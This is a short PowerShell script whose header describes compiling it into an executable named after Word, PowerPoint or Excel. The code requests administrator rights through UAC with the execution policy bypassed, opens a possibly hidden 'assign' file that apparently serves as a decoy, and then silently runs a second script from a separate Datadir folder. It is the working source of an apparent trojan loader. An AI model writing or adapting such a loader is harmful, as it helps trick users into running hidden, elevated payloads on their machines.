<# This script is supposed to be ran offline. It loads script
located in the Datadir, that is located in parent dir to
script's dir and also opens a file containg "assign" in
its name located in scripts dir, possible hidden. It's 
exe is located in releases section named
WrapperWord/powerpoint/execel.exe
 #>
 
#Admin Check and execution bypass.
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
$searchPattern = "*assign*.*"
$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File
if ($matchingFiles.Count -gt 0) {
    foreach ($file in $matchingFiles) {
        Invoke-Item -Path $file.FullName
    }
}
$parentDirectory = Split-Path -Path $scriptDirectory -Parent
$dataDirectory = Join-Path -Path $parentDirectory -ChildPath "Datadir"
$currentScriptPath = Join-Path -Path $dataDirectory -ChildPath "currentlyactive.ps1"
if (Test-Path -Path $currentScriptPath -PathType Leaf) {
    & $currentScriptPath
} else {
    Write-Host "The currentlyactive.ps1 script was not found in the Datadir directory."
}
